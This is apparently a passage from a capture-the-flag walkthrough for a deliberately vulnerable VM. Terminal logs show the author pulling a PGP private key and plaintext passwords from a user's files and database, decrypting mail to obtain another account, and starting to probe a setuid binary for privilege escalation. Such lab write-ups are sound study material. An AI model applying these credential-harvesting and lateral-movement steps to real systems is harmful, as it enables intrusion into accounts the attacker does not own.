<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~# ssh <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x6a;&amp;#97;&amp;#x63;&amp;#107;&amp;#x40;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#52;&amp;#54;&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;#106;&amp;#97;&amp;#99;&amp;#x6b;&amp;#64;&amp;#x31;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x30;&amp;#46;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x34;&amp;#x36;</span><span class="nt">&lt;/a&gt;</span>
</span><span class='line'><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#106;&amp;#97;&amp;#x63;&amp;#x6b;&amp;#x40;&amp;#x31;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#48;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#54;&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;#x6a;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x40;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#52;&amp;#x36;</span><span class="nt">&lt;/a&gt;</span><span class="ni">&amp;rsquo;</span>s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sun Jul 12 05:12:42 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1001(jack) gid=1001(jack) groups=1001(jack)
</span><span class='line'>$ pwd
</span><span class='line'>/home/jack
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4096 Jun 18  2014 g0tmi1k_pics
</span><span class='line'>$ ls -l g0tmi1k_pics
</span><span class='line'>total 284
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 180289 Dec  1  2010 1.jpg
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  29494 Sep 12  2013 2.jpg
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  72070 Jun 18  2014 3.jpg
</span><span class='line'>$ ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack jack 4.0K Jul 12 05:28 .
</span><span class='line'>drwxr-xr-x 7 root root 4.0K Jul  5  2014 ..
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 3.4K Jun 18  2014 .bashrc
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 g0tmi1k_pics
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jul 12 05:30 .gnupg
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 .pgp
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  675 Jan  1  2013 .profile
</span><span class='line'>$ cd .pgp
</span><span class='line'>$ ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 .
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack jack 4.0K Jul 12 05:28 ..
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack   39 Jun 18  2014 note
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 1.8K Jun 18  2014 pgp.priv
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  890 Jun 18  2014 pgp.pub
</span><span class='line'>$ cat note
</span><span class='line'>The usual password as with everything.
</span><span class='line'>$ cat pgp.priv
</span><span class='line'><span class="ni">&amp;mdash;&amp;ndash;</span>BEGIN PGP PRIVATE KEY BLOCK<span class="ni">&amp;mdash;&amp;ndash;</span>
</span><span class='line'>Version: BCPG C# v1.6.1.0<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
</span><span class='line'>tqg=
</span><span class='line'>=SCkw
</span><span class='line'><span class="ni">&amp;mdash;&amp;ndash;</span>END PGP PRIVATE KEY BLOCK<span class="ni">&amp;mdash;&amp;ndash;</span>
</span><span class='line'>$
</span></code></pre></td></tr></table></div></figure></p>

<p>After poking around, I found <code>.pgp</code> hidden folder which include PGP private key and public key in jack&rsquo;s home directory, take a note and will be used later.</p>

<h2>Moving to <em>milk_4_life</em></h2>

<p>Then I was trying to login to MYSQL database and found jack&rsquo;s web admin password is <em><font color="red">g0tmi1k69</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ mysql -uwww-data -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 37
</span><span class='line'>Server version: 5.5.37-0+wheezy1 (Debian)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Copyright <span class="ni">&amp;copy;</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Type <span class="ni">&amp;lsquo;</span>help;<span class="ni">&amp;rsquo;</span> or <span class="ni">&amp;lsquo;</span>\h<span class="ni">&amp;rsquo;</span> for help. Type <span class="ni">&amp;lsquo;</span>\c<span class="ni">&amp;rsquo;</span> to clear the current input statement.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; show databases;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| Database           |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| information_schema |
</span><span class='line'>| website            |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>2 rows in set (0.01 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; use website
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Database changed
</span><span class='line'>mysql&gt; show tables;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>| Tables_in_website |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>| users             |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>1 row in set (0.00 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; select * from users;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| username | password  |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| Jack     | g0tmi1k69 |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>1 row in set (0.00 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I found there is an email for jack but it is encrypted by PGP, so I need using pgp private key (which is found before) to decrypt the message. Here is a handy <code>gpg</code> help <a href="http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/gpg-cs.html">guide</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -alh /var/mail
</span><span class='line'>total 16K
</span><span class='line'>drwxrwsr-x  4 root   mail   4.0K Jul 15 09:25 .
</span><span class='line'>drwxr-xr-x 12 root   root   4.0K Jun 17  2014 ..
</span><span class='line'>drwxr-sr-x  2 george george 4.0K Jun 20  2014 george
</span><span class='line'>drwxr-sr-x  3 jack   jack   4.0K Jul  5  2014 jack
</span><span class='line'>$ ls -alh /var/mail/jack
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 .
</span><span class='line'>drwxrwsr-x 4 root mail 4.0K Jul 15 09:25 ..
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 received
</span><span class='line'>$ ls -alh /var/mail/jack/received
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 .
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root mail  709 Jun 18  2014 message.eml
</span><span class='line'>$ cat /var/mail/jack/received/message.eml
</span><span class='line'>&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
</span><span class='line'>Version: BCPG C# v1.6.1.0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
</span><span class='line'>=svWU
</span><span class='line'>&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;
</span><span class='line'>$ gpg &ndash;allow-secret-key-import &ndash;import .pgp/pgp.priv
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
</span><span class='line'>gpg: key 3F18AB0A: &ldquo;&lt;a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x6a;&#97;&#99;&#107;&#64;&#x63;&#111;&#x77;&#x6c;&#x6f;&#118;&#101;&#114;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#x61;&#99;&#107;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#x73;&#x2e;&#99;&#x6f;&#109;&lt;/a>&rdquo; not changed
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:              unchanged: 1
</span><span class='line'>gpg:       secret keys read: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span><span class='line'>$ gpg /var/mail/jack/received/message.eml&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You need a passphrase to unlock the secret key for
</span><span class='line'>user: &ldquo;&lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#x61;&#99;&#x6b;&#64;&#99;&#111;&#119;&#108;&#x6f;&#x76;&#x65;&#114;&#115;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#97;&#99;&#107;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#46;&#99;&#x6f;&#x6d;&lt;/a>&rdquo;
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      &ldquo;&lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#x6a;&#x61;&#x63;&#107;&#64;&#99;&#x6f;&#119;&#108;&#x6f;&#118;&#101;&#x72;&#115;&#x2e;&#99;&#111;&#x6d;">&#106;&#97;&#x63;&#107;&#64;&#99;&#x6f;&#119;&#x6c;&#111;&#x76;&#101;&#114;&#115;&#x2e;&#99;&#111;&#x6d;&lt;/a>&rdquo;
</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
</span><span class='line'>Enter new filename [text.txt]:
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>$ cat text.txt
</span><span class='line'>Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The password is &lsquo;4J0WWvL5nS&rsquo;
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here we got user <code>milk_4_life</code> has password: <em><font color="red">4J0WWvL5nS</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh milk_4_life@localhost
</span><span class='line'>The authenticity of host &lsquo;localhost (::1)&rsquo; can&rsquo;t be established.
</span><span class='line'>ECDSA key fingerprint is e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added &lsquo;localhost&rsquo; (ECDSA) to the list of known hosts.
</span><span class='line'>milk_4_life@localhost&rsquo;s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul 12 07:02:03 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
</span><span class='line'>$ pwd
</span><span class='line'>/home/milk_4_life
</span><span class='line'>$ ls -l
</span><span class='line'>total 12
</span><span class='line'>&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19  2014 game
</span><span class='line'>-rwxr-xr-x 1 milk_4_life milk_4_life  473 Jul 11 20:36 win.py
</span><span class='line'>$ ls -alh
</span><span class='line'>total 36K
</span><span class='line'>drwx&mdash;&mdash; 2 milk_4_life milk_4_life 4.0K Jul 12 06:59 .
</span><span class='line'>drwxr-xr-x 7 root        root        4.0K Jul  5  2014 ..
</span><span class='line'>-rw&mdash;&mdash;- 1 milk_4_life milk_4_life   51 Jul 12 07:24 .bash_history
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life 3.4K Jan  1  2013 .bashrc
</span><span class='line'>&mdash;s&ndash;x&ndash;x 1 george      george      5.7K Jun 19  2014 game
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life  675 Jan  1  2013 .profile</span></code></pre></td></tr></table></div></figure></p>

<h2>Moving to <em>george</em></h2>

<p>Here we can see that there is program <code>game</code> which is owned by george and sticky bit has been set. That means this program has high possibility to be exploited for privilege escaping to george.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:57356                                                           &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:111                                                             &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:22                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;em>:666                                                             &lt;/em>:*   &lt;br/>
</span><span class='line'>$ ./game &amp;
</span><span class='line'>$ I&rsquo;m listening&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ss -lnt
